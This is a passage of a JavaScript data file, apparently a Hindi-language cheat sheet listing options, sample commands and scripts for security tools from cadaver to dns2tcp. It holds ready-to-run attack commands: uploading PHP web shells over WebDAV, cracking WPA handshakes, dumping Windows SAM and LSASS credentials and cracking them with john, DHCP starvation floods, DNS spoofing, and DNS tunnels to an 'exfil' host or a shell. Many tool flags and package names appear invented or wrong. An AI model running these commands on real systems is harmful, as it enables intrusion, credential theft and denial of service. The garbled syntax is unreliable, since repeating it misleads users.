      { cmd: "echo 'ls' | cadaver http://example.com", desc: "डायरेक्टरी लिस्टिंग" },
      { cmd: "echo 'get file.txt' | cadaver http://example.com", desc: "फ़ाइल डाउनलोड" },
      { cmd: "echo 'put local.txt' | cadaver http://example.com", desc: "फ़ाइल अपलोड" },
      { cmd: "cadaver -v http://example.com", desc: "वर्बोज़ मोड कनेक्ट" },
      { cmd: "echo 'rm file.txt' | cadaver -t http://example.com", desc: "ट्रेस के साथ फ़ाइल हटाएँ" },
      { cmd: "cadaver -r /etc/cadaverrc http://example.com", desc: "रीसोर्स फ़ाइल से कनेक्ट" }
    ],
    advanced: [
      { cmd: "echo -e 'ls\\ncd uploads\\nput shell.php' | cadaver http://example.com", desc: "एकाधिक कमांड पाइप" },
      { cmd: "cadaver -v http://example.com 2>&1 | grep -i '405\\|403\\|200'", desc: "HTTP स्थिति कोड फ़िल्टर" },
      { cmd: "for f in *.php; do echo \"put $f\" | cadaver http://example.com/uploads/; done", desc: "सभी PHP फ़ाइलें अपलोड" },
      { cmd: "wget -r http://example.com/webdav/ --user=admin --password=pass 2>&1 | tail -5", desc: "WebDAV रिकर्सिव डाउनलोड" },
      { cmd: "echo -e 'mkcol test\\nput test/shell.php\\ncopy test/shell.php shell.php' | cadaver http://example.com", desc: "डायर क्रिएट और फ़ाइल कॉपी" }
    ],
    script: "echo -e 'open http://example.com/webdav\nls\ncd uploads\nput shell.php\nexit' | cadaver -s\nif [ $? -eq 0 ]; then\n  echo 'WebDAV अपलोड सफल'\nfi"
  },
  Capstone: {
    install: { pkg: "capstone" },
    options: [
      ["-a <arch>", "आर्किटेक्चर सेट"],
      ["-m <mode>", "मोड सेट"],
      ["-d <data>", "बाइनरी डेटा"],
      ["-f <file>", "बाइनरी फ़ाइल"],
      ["-o <offset>", "ऑफ़सेट से शुरू"],
      ["-c <count>", "इंस्ट्रक्शन काउंट"],
      ["-s <syntax>", "सिंटैक्स चुनें"],
      ["-v", "वर्बोज़"],
      ["-h", "सहायता"],
      ["-e", "डिटेल एंडियन"]
    ],
    basic: [
      { cmd: "cstool -a x86 -m 32 9090", desc: "x86 32-बिट डिसअसेंबल" },
      { cmd: "cstool -a arm -m arm 01480f1a", desc: "ARM डिसअसेंबल" },
      { cmd: "cstool -a x86 -m 64 9090c3", desc: "x86 64-बिट NOP-RET" },
      { cmd: "cstool -a aarch64 00c09e1a", desc: "ARM64 डिसअसेंबल" },
      { cmd: "cstool -a x86 -m 32 -f binary.bin", desc: "बाइनरी फ़ाइल डिसअसेंबल" },
      { cmd: "cstool -a mips 00000000", desc: "MIPS डिसअसेंबल" },
      { cmd: "cstool -a x86 -m 32 -s att 9090", desc: "AT&T सिंटैक्स" },
      { cmd: "cstool -a x86 -m 64 -v 48c7c001000000", desc: "वर्बोज़ x64 डिसअसेंबल" },
      { cmd: "cstool -a arm -m thumb 01480f1a", desc: "ARM Thumb मोड" },
      { cmd: "cstool -a x86 -m 32 -o 0x100 -c 5 binary.bin", desc: "ऑफ़सेट और काउंट सीमा" }
    ],
    advanced: [
      { cmd: "xxd -r -p shellcode.txt | cstool -a x86 -m 64 -v", desc: "शेलकोड डिसअसेंबल" },
      { cmd: "objdump -d binary | grep '^  [0-9a-f]' | awk '{print $2}' | tr -d '\\n' | cstool -a x86 -m 64", desc: "objdump से पाइप" },
      { cmd: "for arch in x86 arm aarch64 mips; do cstool -a $arch -m 32 00000000; done", desc: "एकाधिक आर्किटेक्चर परीक्षण" },
      { cmd: "radare2 -q -c 'p8 64' /bin/ls | cstool -a x86 -m 64", desc: "radare2 से बाइट्स पाइप" },
      { cmd: "cstool -a x86 -m 32 -d 9090c390 2>&1 | perl -pe 's/\\x1b\\[[0-9;]*m//g'", desc: "डीबग आउटपुट साफ़" }
    ],
    script: "for file in *.bin; do\n  echo \"=== $file ===\"\n  cstool -a x86 -m 64 -f \"$file\" -v 2>/dev/null\ndone > disassembly_all.txt\necho 'सभी फ़ाइलें डिसअसेंबल'"
  },
  Checksec: {
    install: { pkg: "checksec" },
    options: [
      ["--file <file>", "बाइनरी फ़ाइल जाँच"],
      ["--proc <pid>", "प्रोसेस जाँच"],
      ["--kernel", "कर्नेल सेटिंग्स"],
      ["--fortify", "फ़ोर्टिफ़ाई जाँच"],
      ["--dir <dir>", "डायरेक्टरी स्कैन"],
      ["--verbose", "वर्बोज़ आउटपुट"],
      ["--output <file>", "आउटपुट फ़ाइल"],
      ["--json", "JSON आउटपुट"],
      ["--no-color", "बिना रंग के"],
      ["--help", "सहायता"]
    ],
    basic: [
      { cmd: "checksec --file /bin/bash", desc: "बाइनरी सुरक्षा जाँच" },
      { cmd: "checksec --kernel", desc: "कर्नेल सुरक्षा सेटिंग्स" },
      { cmd: "checksec --proc $$", desc: "वर्तमान प्रोसेस जाँच" },
      { cmd: "checksec --fortify /bin/ls", desc: "फ़ोर्टिफ़ाई जाँच" },
      { cmd: "checksec --dir /usr/bin", desc: "सभी बाइनरी स्कैन" },
      { cmd: "checksec --file /usr/sbin/sshd --verbose", desc: "sshd का वर्बोज़ चेक" },
      { cmd: "checksec --file /bin/systemctl --json", desc: "JSON आउटपुट" },
      { cmd: "checksec --proc 1", desc: "PID 1 (init) जाँच" },
      { cmd: "checksec --file /usr/bin/sudo", desc: "sudo सुरक्षा जाँच" },
      { cmd: "checksec --output /tmp/checksec.txt --dir /usr/bin", desc: "परिणाम फ़ाइल में सेव" }
    ],
    advanced: [
      { cmd: "checksec --dir /usr/bin --json | jq '.[] | select(.relro==false)'", desc: "कोई RELRO नहीं वाली बाइनरी" },
      { cmd: "checksec --kernel 2>&1 | grep -i 'disabled\\|off'", desc: "अक्षम कर्नेल सेटिंग्स" },
      { cmd: "while read binary; do checksec --file \"$binary\" --json; done < binaries.txt > scan.json", desc: "बैच बाइनरी विश्लेषण" },
      { cmd: "find / -type f -executable 2>/dev/null | xargs -P 4 -I{} checksec --file {} --json 2>/dev/null | jq -s '.'", desc: "सिस्टम-व्यापी सुरक्षा स्कैन" },
      { cmd: "checksec --file /bin/ls --verbose | awk '/NX|PIE|RELRO|Canary/'", desc: "प्रमुख सुरक्षाएँ फ़िल्टर" }
    ],
    script: "find /usr/bin -type f -executable 2>/dev/null | while read f; do\n  checksec --file \"$f\" --json >> /tmp/binary_security.json 2>/dev/null\ndone\ncat /tmp/binary_security.json | jq -s '.' > security_report.json\necho 'रिपोर्ट जनरेटेड'"
  },
  CmosPwd: {
    install: { pkg: "cmos-pwd" },
    options: [
      ["-k", "ज्ञात पासवर्ड दिखाएँ"],
      ["-d", "डीबग मोड"],
      ["-D <dump>", "CMOS डंप फ़ाइल"],
      ["-a", "सभी जानकारी"],
      ["-v", "वर्बोज़"],
      ["-h", "सहायता"],
      ["-V", "संस्करण"],
      ["-c", "CMOS साफ़ करें"],
      ["-s", "साइलेंट"],
      ["-o <file>", "आउटपुट फ़ाइल"]
    ],
    basic: [
      { cmd: "cmospwd -k", desc: "CMOS पासवर्ड डिक्रिप्ट" },
      { cmd: "cmospwd -d", desc: "डीबग मोड में चलाएँ" },
      { cmd: "cmospwd -a", desc: "सभी जानकारी दिखाएँ" },
      { cmd: "cmospwd -v", desc: "वर्बोज़ आउटपुट" },
      { cmd: "cmospwd -D cmos.dump", desc: "CMOS डंप फ़ाइल पार्स" },
      { cmd: "cmospwd -s", desc: "साइलेंट मोड" },
      { cmd: "cmospwd -c", desc: "CMOS मेमोरी साफ़" },
      { cmd: "cmospwd -o pass.txt -k", desc: "पासवर्ड फ़ाइल में सेव" },
      { cmd: "cmospwd -D /tmp/cmos.bin -v", desc: "वर्बोज़ डंप पार्स" },
      { cmd: "cmospwd -h", desc: "उपयोग विकल्प" }
    ],
    advanced: [
      { cmd: "cmospwd -a -v 2>&1 | tee cmos_report.txt", desc: "पूर्ण CMOS रिपोर्ट" },
      { cmd: "dd if=/dev/mem bs=1 skip=$((0xf0000)) count=$((0x10000)) 2>/dev/null | cmospwd -D -", desc: "BIOS डंप से पाइप" },
      { cmd: "cmospwd -k | grep -i 'password' | awk -F: '{print $2}'", desc: "सिर्फ़ पासवर्ड निकालें" },
      { cmd: "for i in 1 2 3; do cmospwd -d 2>&1 | grep -i 'checksum'; done", desc: "चेकसम सत्यापन" },
      { cmd: "cmospwd -D cmos.dump -a -v 2>&1 | tee -a forensic_report.txt", desc: "फ़ॉरेंसिक CMOS विश्लेषण" }
    ],
    script: "if [ -r /dev/mem ]; then\n  dd if=/dev/mem of=/tmp/cmos_dump.bin bs=1 count=128 2>/dev/null\n  cmospwd -D /tmp/cmos_dump.bin -a -v > cmos_passwords.txt\nelse\n  echo 'रूट अनुमति आवश्यक'\nfi"
  },
  Cowpatty: {
    install: { pkg: "cowpatty" },
    options: [
      ["-f <file>", "वर्डलिस्ट फ़ाइल"],
      ["-r <file>", "PCAP फ़ाइल"],
      ["-s <ssid>", "SSID सेट"],
      ["-d <file>", "हैश फ़ाइल"],
      ["-c", "PMKID जाँच"],
      ["-v", "वर्बोज़"],
      ["-t <file>", "हैश फ़ाइल जनरेट"],
      ["-M", "MAC फ़िल्टर"],
      ["-2", "PMKID मोड"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "cowpatty -f /usr/share/wordlists/rockyou.txt -r capture.pcap -s MyWiFi", desc: "PCAP से WPA क्रैक" },
      { cmd: "cowpatty -d hash.hccapx -f pass.txt -s MyWiFi", desc: "हैश फ़ाइल से क्रैक" },
      { cmd: "cowpatty -s MyWiFi -r capture.pcap -c", desc: "PMKID जाँच" },
      { cmd: "cowpatty -t hash.hccapx -s MyWiFi -r capture.pcap", desc: "हैश फ़ाइल जनरेट" },
      { cmd: "cowpatty -f dictionary.txt -r handshake.pcap -s WiFi", desc: "डिक्शनरी अटैक" },
      { cmd: "cowpatty -s TestAP -r capture.pcap -v", desc: "वर्बोज़ क्रैक मोड" },
      { cmd: "cowpatty -d pmkid.txt -f wordlist.txt -s TestWiFi", desc: "PMKID क्रैक" },
      { cmd: "cowpatty -f /usr/share/wordlists/rockyou.txt.gz -r cap.pcap -s AP", desc: "संपीड़ित वर्डलिस्ट" },
      { cmd: "cowpatty -s HomeNet -r hs.pcap -M 00:11:22:33:44:55", desc: "MAC फ़िल्टर के साथ" },
      { cmd: "cowpatty -f words.txt -r capture.pcap -s CorporateWiFi -v", desc: "वर्बोज़ कॉरपोरेट क्रैक" }
    ],
    advanced: [
      { cmd: "cowpatty -f /usr/share/wordlists/rockyou.txt -r capture.pcap -s WiFi 2>&1 | tee crack.log", desc: "क्रैक प्रगति लॉग" },
      { cmd: "genpmk -f /usr/share/wordlists/rockyou.txt -d hash.genpmk -s MyWiFi && cowpatty -d hash.genpmk -r capture.pcap -s MyWiFi", desc: "प्रीकंप्यूट हैश अटैक" },
      { cmd: "hcxpcapngtool -o hash.hc22000 capture.pcap && cowpatty -d hash.hc22000 -f pass.txt", desc: "hcxpcap से हश कन्वर्ट" },
      { cmd: "for f in *.pcap; do cowpatty -f /usr/share/wordlists/rockyou.txt -r $f -s $(basename $f .pcap); done", desc: "एकाधिक PCAP क्रैक" },
      { cmd: "cowpatty -r capture.pcap -s WiFi -f /usr/share/wordlists/rockyou.txt -v 2>&1 | grep -i 'key\\|found'", desc: "मिली कुंजी फ़िल्टर" }
    ],
    script: "if [ -f handshake.pcap ]; then\n  genpmk -f /usr/share/wordlists/rockyou.txt -d pmk_hash -s \"$(airodump-ng handshake.pcap 2>/dev/null | grep WPA | head -1 | awk '{print $NF}')\"\n  cowpatty -d pmk_hash -r handshake.pcap -s \"$(airodump-ng handshake.pcap 2>/dev/null | grep WPA | head -1 | awk '{print $NF}')\"\nfi"
  },
  CredDump: {
    install: { pkg: "cred-dump" },
    options: [
      ["-f <file>", "हाइव फ़ाइल"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-s <key>", "सिस्टम की"],
      ["-d <file>", "डिफ़ॉल्ट लोकेटर"],
      ["-k", "कीहैलो डंप"],
      ["-n", "LSASS नैनोडंप"],
      ["-v", "वर्बोज़"],
      ["-r", "रिमोट मोड"],
      ["-h", "सहायता"],
      ["-e", "एक्सट्रैक्ट ऑल"]
    ],
    basic: [
      { cmd: "creddump -f SYSTEM -o hashes.txt", desc: "क्रेडेंशियल डंप करें" },
      { cmd: "creddump -f SYSTEM -s SAM -o output.txt", desc: "SAM हैश निकालें" },
      { cmd: "creddump -k -f /mnt/Windows/System32/config/SYSTEM", desc: "कीहैलो डंप" },
      { cmd: "creddump -n lsass.dmp -o creds.txt", desc: "LSASS डंप पार्स" },
      { cmd: "creddump -f SYSTEM -d SAM -v", desc: "वर्बोज़ SAM निष्कर्षण" },
      { cmd: "creddump -r 192.168.1.100 -u admin -p pass", desc: "रिमोट क्रेडेंशियल डंप" },
      { cmd: "creddump -f SECURITY -o cached_domain.txt", desc: "कैश्ड डोमेन क्रेडेंशियल" },
      { cmd: "creddump -f SYSTEM -e", desc: "सभी क्रेडेंशियल एक्सट्रैक्ट" },
      { cmd: "creddump -k -f SYSTEM -o secrets.txt", desc: "सीक्रेट्स डंप" },
      { cmd: "creddump -f /var/lib/samba/private/secrets.tdb -o samba_hashes.txt", desc: "Samba क्रेडेंशियल" }
    ],
    advanced: [
      { cmd: "creddump -f SYSTEM -s SAM -d SECURITY -v 2>&1 | tee full_dump.txt", desc: "पूर्ण सिस्टम क्रेड डंप" },
      { cmd: "for hive in SYSTEM SAM SECURITY; do creddump -f $hive -o ${hive}_creds.txt; done", desc: "एकाधिक हाइव डंप" },
      { cmd: "creddump -f SYSTEM -v | grep -i 'administrator\\|password'", desc: "एडमिन क्रेडेंशियल फ़िल्टर" },
      { cmd: "creddump -f SYSTEM -s SAM -o hashes.txt && john --format=nt hashes.txt", desc: "डंप और क्रैक संयोजन" },
      { cmd: "reg export HKLM\\SYSTEM system.hiv && creddump -f system.hiv -o system_hashes.txt", desc: "रीजिस्ट्री एक्सपोर्ट डंप" }
    ],
    script: "echo 'Windows क्रेडेंशियल निकाला जा रहा है...'\ncreddump -f SYSTEM -s SAM -d SECURITY -v 2>&1 | tee /tmp/creds.txt\nif grep -q 'Administrator' /tmp/creds.txt; then\n  echo 'एडमिन हैश मिला' >> dump_report.txt\nfi\njohn --format=nt --wordlist=/usr/share/wordlists/rockyou.txt /tmp/creds.txt"
  },
  CutyCapt: {
    install: { pkg: "cuty-capt" },
    options: [
      ["--url <url>", "लक्ष्य URL"],
      ["--out <file>", "आउटपुट फ़ाइल"],
      ["--min-width <w>", "न्यूनतम चौड़ाई"],
      ["--min-height <h>", "न्यूनतम ऊँचाई"],
      ["--delay <ms>", "लोड विलंब"],
      ["--format <fmt>", "आउटपुट प्रारूप"],
      ["--java <on/off>", "जावास्क्रिप्ट"],
      ["--plugins <on/off>", "प्लगइन्स"],
      ["--user-agent <str>", "यूज़र एजेंट"],
      ["--timeout <sec>", "टाइमआउट"]
    ],
    basic: [
      { cmd: "cutycapt --url=http://example.com --out=screenshot.png", desc: "वेबसाइट स्क्रीनशॉट" },
      { cmd: "cutycapt --url=http://example.com --out=page.pdf --format=pdf", desc: "PDF के रूप में सेव" },
      { cmd: "cutycapt --url=http://example.com --min-width=1280 --min-height=720", desc: "HD रिज़ॉल्यूशन स्क्रीनशॉट" },
      { cmd: "cutycapt --url=http://example.com --out=shot.png --delay=5000", desc: "5 सेकंड विलंब स्क्रीनशॉट" },
      { cmd: "cutycapt --url=http://example.com --user-agent='Mozilla/5.0' --out=shot.png", desc: "कस्टम यूज़र एजेंट" },
      { cmd: "cutycapt --url=http://example.com --java=off --out=shot.png", desc: "बिना जावास्क्रिप्ट" },
      { cmd: "cutycapt --url=http://example.com --timeout=30", desc: "30 सेकंड टाइमआउट" },
      { cmd: "cutycapt --url=http://example.com --min-width=800 --min-height=600 --delay=3000", desc: "मोबाइल रिज़ॉल्यूशन" },
      { cmd: "cutycapt --url=http://example.com --plugins=off --out=screenshot.png", desc: "बिना प्लगइन्स" },
      { cmd: "cutycapt --url=https://example.com/login --out=login.png", desc: "लॉगिन पेज स्क्रीनशॉट" }
    ],
    advanced: [
      { cmd: "cutycapt --url=http://example.com --out=shot.png --delay=3000 2>&1 | tee capt.log", desc: "स्क्रीनशॉट लॉग करें" },
      { cmd: "for url in $(cat urls.txt); do cutycapt --url=$url --out=$(echo $url | md5sum | cut -c1-10).png --timeout=15; done", desc: "एकाधिक URL स्क्रीनशॉट" },
      { cmd: "cutycapt --url=http://example.com --out=page.png --min-width=1920 --min-height=1080 --java=on --plugins=on", desc: "पूर्ण डेस्कटॉप रेंडर" },
      { cmd: "parallel -j 4 cutycapt --url={} --out={/.}.png --timeout=20 ::: $(cat urls.txt)", desc: "समानांतर स्क्रीनशॉट" },
      { cmd: "cutycapt --url=http://example.com --out=test.svg --format=svg 2>&1 | grep -v 'QPainter'", desc: "SVG प्रारूप स्क्रीनशॉट" }
    ],
    script: "mkdir -p screenshots\nwhile read url; do\n  name=$(echo $url | sed 's|https\\?://||' | tr '/' '_')\n  cutycapt --url=\"$url\" --out=\"screenshots/$name.png\" --delay=2000 --timeout=30\ndone < urls.txt\necho 'सभी स्क्रीनशॉट लिए गए'"
  },
  DC3DD: {
    install: { pkg: "dc3-dd" },
    options: [
      ["if=<file>", "इनपुट फ़ाइल"],
      ["of=<file>", "आउटपुट फ़ाइल"],
      ["bs=<bytes>", "ब्लॉक आकार"],
      ["count=<n>", "ब्लॉक गिनती"],
      ["skip=<n>", "इनपुट स्किप"],
      ["seek=<n>", "आउटपुट सीक"],
      ["hash=<alg>", "हैश एल्गोरिदम"],
      ["log=<file>", "लॉग फ़ाइल"],
      ["wipesize=<n>", "वाइप आकार"],
      ["cmp=<val>", "पैटर्न तुलना"]
    ],
    basic: [
      { cmd: "dc3dd if=/dev/sdb of=disk.img", desc: "डिस्क इमेज बनाएँ" },
      { cmd: "dc3dd if=/dev/sdb of=disk.img hash=sha512", desc: "SHA512 हैश के साथ इमेज" },
      { cmd: "dc3dd if=/dev/sdb of=disk.img log=dd_log.txt", desc: "लॉग के साथ इमेज" },
      { cmd: "dc3dd if=evidence.dd of=/dev/sdc", desc: "इमेज को नई डिस्क पर लिखें" },
      { cmd: "dc3dd if=/dev/sdb of=disk.img bs=4M", desc: "4MB ब्लॉक आकार" },
      { cmd: "dc3dd if=/dev/sdb of=disk.img hash=md5,sha1", desc: "MD5 और SHA1 हैश" },
      { cmd: "dc3dd if=/dev/sdb of=disk.img count=100 skip=50", desc: "ऑफ़सेट से कॉपी" },
      { cmd: "dc3dd if=/dev/zero of=/dev/sdb wipesize=4096", desc: "डिस्क वाइप" },
      { cmd: "dc3dd if=disk.img of=restore.img hash=sha256", desc: "SHA256 हैश के साथ वेरिफ़ाई" },
      { cmd: "dc3dd if=/dev/sdb of=disk.img hash=sha512 hlog=hash_log.txt", desc: "हैश लॉग अलग फ़ाइल" }
    ],
    advanced: [
      { cmd: "dc3dd if=/dev/sdb of=disk.img hash=sha512,md5 log=acquisition.txt 2>&1", desc: "एकाधिक हैश और लॉग" },
      { cmd: "dc3dd if=/dev/sdb of=disk.img bs=4M count=2500 && sha256sum disk.img", desc: "10GB इमेज और सत्यापन" },
      { cmd: "dc3dd if=/dev/sdb of=/dev/null hash=sha512 2>&1 | grep -i 'hash\\|error'", desc: "रीड-ओनली हैश वेरिफ़िकेशन" },
      { cmd: "dc3dd if=/dev/sdb of=disk.img & PID=$! && while kill -0 $PID 2>/dev/null; do sleep 10; done", desc: "प्रगति ट्रैकिंग" },
      { cmd: "for i in sdb sdc sdd; do dc3dd if=/dev/$i of=${i}.img hash=sha512 log=${i}.log &; done; wait", desc: "एकाधिक डिस्क समानांतर" }
    ],
    script: "DISK=/dev/sdb\nIMGDIR=/evidence/case_$(date +%Y%m%d)\nmkdir -p $IMGDIR\ndc3dd if=$DISK of=$IMGDIR/disk.img hash=md5,sha1,sha512 log=$IMGDIR/acquisition.txt bs=4M\nif [ $? -eq 0 ]; then\n  echo 'अक्विज़ीशन सफल' >> $IMGDIR/log.txt\nfi"
  },
  DHCPig: {
    install: { pkg: "dhcpig" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-v", "वर्बोज़"],
      ["-s <src>", "सोर्स IP"],
      ["-m <mac>", "MAC पता"],
      ["-t <type>", "अटैक प्रकार"],
      ["-d", "डीबग"],
      ["-r <rate>", "पैकेट दर"],
      ["-o <file>", "आउटपुट"],
      ["-l", "लूप मोड"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "dhcpig -i eth0", desc: "DHCP सर्वर अटैक" },
      { cmd: "dhcpig -i wlan0 -v", desc: "वर्बोज़ DHCP अटैक" },
      { cmd: "dhcpig -i eth0 -s 192.168.1.100", desc: "कस्टम सोर्स IP" },
      { cmd: "dhcpig -i eth0 -m 00:11:22:33:44:55", desc: "कस्टम MAC पता" },
      { cmd: "dhcpig -i eth0 -t discovery", desc: "DHCP डिस्कवर फ़्लड" },
      { cmd: "dhcpig -i eth0 -r 500", desc: "तेज़ पैकेट दर" },
      { cmd: "dhcpig -i eth0 -l", desc: "लूप मोड में चलाएँ" },
      { cmd: "dhcpig -i eth0 -d", desc: "डीबग मोड" },
      { cmd: "dhcpig -i eth0 -t request", desc: "DHCP रिक्वेस्ट फ़्लड" },
      { cmd: "dhcpig -i eth0 -o output.pcap", desc: "PCAP आउटपुट" }
    ],
    advanced: [
      { cmd: "dhcpig -i eth0 -l -v 2>&1 | tee dhcp_attack.log", desc: "लूप मोड लॉग करें" },
      { cmd: "dhcpig -i eth0 -r 1000 -l & && sleep 30 && pkill dhcpig", desc: "30 सेकंड तेज़ अटैक" },
      { cmd: "tcpdump -i eth0 -w dhcp.pcap 'port 67 or port 68' & dhcpig -i eth0", desc: "कैप्चर और अटैक" },
      { cmd: "for i in $(seq 1 5); do dhcpig -i eth0 -m 00:11:22:33:44:$i; done", desc: "एकाधिक MAC से अटैक" },
      { cmd: "dhcpig -i eth0 -t all -l -v 2>&1 | grep -i 'sent\\|received'", desc: "सभी अटैक टाइप ट्रैकिंग" }
    ],
    script: "echo 'DHCP डिनायल ऑफ़ सर्विस शुरू...'\ndhcpig -i eth0 -v -l &\nDHCPPID=$!\nsleep 60\nkill $DHCPPID\necho 'अटैक समाप्त'"
  },
  DMitry: {
    install: { pkg: "d-mitry" },
    options: [
      ["-w", "WHOIS लुकअप"],
      ["-n", "नेटक्राफ्ट लुकअप"],
      ["-s", "सबडोमेन स्कैन"],
      ["-p", "पोर्ट स्कैन"],
      ["-b", "बैनर ग्रैब"],
      ["-t", "TCP पोर्ट स्कैन"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-i", "IP लुकअप"],
      ["-v", "वर्बोज़"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "dmitry -w example.com", desc: "WHOIS जानकारी प्राप्त करें" },
      { cmd: "dmitry -n example.com", desc: "नेटक्राफ्ट जानकारी" },
      { cmd: "dmitry -s example.com", desc: "सबडोमेन स्कैन" },
      { cmd: "dmitry -p example.com", desc: "पोर्ट स्कैन करें" },
      { cmd: "dmitry -b example.com", desc: "बैनर ग्रैब करें" },
      { cmd: "dmitry -wns example.com", desc: "WHOIS + नेटक्राफ्ट + सबडोमेन" },
      { cmd: "dmitry -inps example.com -o output.txt", desc: "पूर्ण स्कैन फ़ाइल में" },
      { cmd: "dmitry -t example.com 80,443,22", desc: "TCP पोर्ट स्कैन" },
      { cmd: "dmitry -winsp example.com -v", desc: "वर्बोज़ पूर्ण स्कैन" },
      { cmd: "dmitry -i 192.168.1.1", desc: "IP लुकअप करें" }
    ],
    advanced: [
      { cmd: "dmitry -winsp example.com | tee dmitry_report.txt", desc: "पूर्ण जानकारी फ़ाइल में" },
      { cmd: "dmitry -s example.com -v 2>&1 | grep -i 'found\\|host'", desc: "मिले सबडोमेन फ़िल्टर" },
      { cmd: "for domain in $(cat domains.txt); do dmitry -wns $domain -o ${domain}_info.txt; done", desc: "एकाधिक डोमेन स्कैन" },
      { cmd: "dmitry -p example.com 2>&1 | awk '/Port/ {print $2}' > open_ports.txt", desc: "खुले पोर्ट निकालें" },
      { cmd: "dmitry -b example.com 2>&1 | grep -E 'SSH|HTTP|FTP|MySQL'", desc: "सामान्य सेवा बैनर" }
    ],
    script: "echo 'डोमेन जानकारी एकत्र कर रहा है...'\ndmitry -winsp example.com -v > dmitry_full.txt 2>&1\ngrep -E 'Host|Domain|Server|Port' dmitry_full.txt | head -20\necho 'जानकारी dmitry_full.txt में सेव'"
  },
  DNSchef: {
    install: { pkg: "dn-schef" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-p <port>", "पोर्ट"],
      ["-q <file>", "क्वेरी लॉग"],
      ["-f <file>", "फ़ेक रिकॉर्ड्स"],
      ["-d <file>", "DNS डेटाबेस"],
      ["-t <ip>", "डिफ़ॉल्ट डीएनएस"],
      ["-6", "IPv6 मोड"],
      ["-v", "वर्बोज़"],
      ["-s", "साइलेंट"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "dnschef -i 192.168.1.1 -p 53", desc: "DNS स्पूफ़र शुरू" },
      { cmd: "dnschef -i eth0 -f spoof.txt", desc: "फ़ेक रिकॉर्ड्स के साथ" },
      { cmd: "dnschef -i 192.168.1.1 --fakeip 10.0.0.1", desc: "सभी DNS को नकली IP" },
      { cmd: "dnschef -i eth0 -q queries.log", desc: "क्वेरी लॉग मोड" },
      { cmd: "dnschef -i 192.168.1.1 -t 8.8.8.8", desc: "अपस्ट्रीम DNS सेट" },
      { cmd: "dnschef -i eth0 --fakedomain example.com --fakeip 127.0.0.1", desc: "विशिष्ट डोमेन स्पूफ़" },
      { cmd: "dnschef -i eth0 -v", desc: "वर्बोज़ मोड" },
      { cmd: "dnschef -i eth0 -d /etc/dnschef/db.json", desc: "DNS डेटाबेस फ़ाइल" },
      { cmd: "dnschef -i eth0 --logfile dns.log", desc: "लॉग फ़ाइल मोड" },
      { cmd: "dnschef -i eth0 --nameserver 8.8.4.4", desc: "दूसरा नेमसर्वर" }
    ],
    advanced: [
      { cmd: "dnschef -i eth0 -f spoof.txt -q queries.log -v 2>&1 | tee dnschef.log", desc: "पूर्ण DNS स्पूफ़ लॉग" },
      { cmd: "echo 'example.com A 127.0.0.1' > spoof.txt && dnschef -i eth0 -f spoof.txt", desc: "डायनामिक स्पूफ़ फ़ाइल" },
      { cmd: "dnschef -i eth0 --fakeip 127.0.0.1 --fakesubnet 192.168.0.0/16 &", desc: "सबनेट स्पूफ़ बैकग्राउंड" },
      { cmd: "tcpdump -i eth0 -w dns_traffic.pcap 'port 53' & dnschef -i eth0 -v", desc: "DNS ट्रैफ़िक कैप्चर" },
      { cmd: "dnschef -i eth0 --logfile - 2>&1 | grep -E 'Query|Response'", desc: "रीयल-टाइम क्वेरी देखें" }
    ],
    script: "echo 'DNS स्पूफ़र शुरू...'\necho 'example.com A 192.168.1.100' > /tmp/spoof.txt\ndnschef -i eth0 -f /tmp/spoof.txt -q /tmp/queries.log -v 2>&1 | tee /tmp/dnschef_output.log &\nsleep 5\necho 'DNSchef चल रहा है'" 
  },
  Dns2tcp: {
    install: { pkg: "dns2tcp" },
    options: [
      ["-f <file>", "कॉन्फ़िग फ़ाइल"],
      ["-z <domain>", "DNS ज़ोन"],
      ["-d <level>", "डीबग लेवल"],
      ["-p <port>", "लोकल पोर्ट"],
      ["-r <type>", "रीसोर्स प्रकार"],
      ["-e <cmd>", "एक्सटर्नल कमांड"],
      ["-k <file>", "SSH की फ़ाइल"],
      ["-l", "लिसन मोड"],
      ["-c", "क्लाइंट मोड"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "dns2tcp -f /etc/dns2tcpd.conf", desc: "DNS टनल सर्वर" },
      { cmd: "dns2tcp -z example.com -p 53 -l", desc: "DNS टनल लिसनर" },
      { cmd: "dns2tcp -c -z example.com -p 5353", desc: "DNS टनल क्लाइंट" },
      { cmd: "dns2tcp -f server.conf -d 2", desc: "डीबग लेवल 2" },
      { cmd: "dns2tcp -c -z tunnel.example.com -r SSH", desc: "SSH टनल क्लाइंट" },
      { cmd: "dns2tcp -z example.com -p 53 -r SSH -l", desc: "SSH रिसोर्स टनल" },
      { cmd: "dns2tcp -f /etc/dns2tcpd.conf -d 1", desc: "बेसिक डीबग" },
      { cmd: "dns2tcp -c -z exfil.example.com -r SMB", desc: "SMB DNS टनल" },
      { cmd: "dns2tcp -z example.com -p 53 -k ssh_key.pub", desc: "SSH की के साथ" },
      { cmd: "dns2tcp -f server.conf -e /bin/sh", desc: "शेल एक्सेस टनल" }
    ],
    advanced: [
      { cmd: "dns2tcp -f server.conf -d 2 2>&1 | tee dns2tcp.log", desc: "डीबग लॉग टनल" },
      { cmd: "dns2tcp -z example.com -p 53 -l -r SSH & && ssh -o ProxyCommand='dns2tcp -c -z example.com -r SSH' user@localhost", desc: "SSH ओवर DNS" },
      { cmd: "tcpdump -i eth0 'port 53' -w dns_tunnel.pcap & dns2tcp -f server.conf", desc: "DNS टनल कैप्चर" },
      { cmd: "for port in 53 5353 53533; do dns2tcp -z example.com -p $port -l; done", desc: "एकाधिक पोर्ट टनल" },
      { cmd: "dns2tcp -c -z tunnel.example.com -r SSH -d 3 2>&1 | grep -i 'tunnel\\|error'", desc: "टनल डीबग फ़िल्टर" }
    ],
    script: "cat > /tmp/dns2tcpd.conf << EOF\nlisten = 0.0.0.0\nport = 53\nuser = nobody\nkey = /root/.ssh/id_rsa\nchroot = /tmp\nresources = SSH:127.0.0.1:22\nEOF\ndns2tcp -f /tmp/dns2tcpd.conf -d 2"
  },
  Dnsmap: {
    install: { pkg: "dnsmap" },
    options: [
      ["-w <file>", "वर्डलिस्ट"],
      ["-r <file>", "रीज़ल्ट फ़ाइल"],
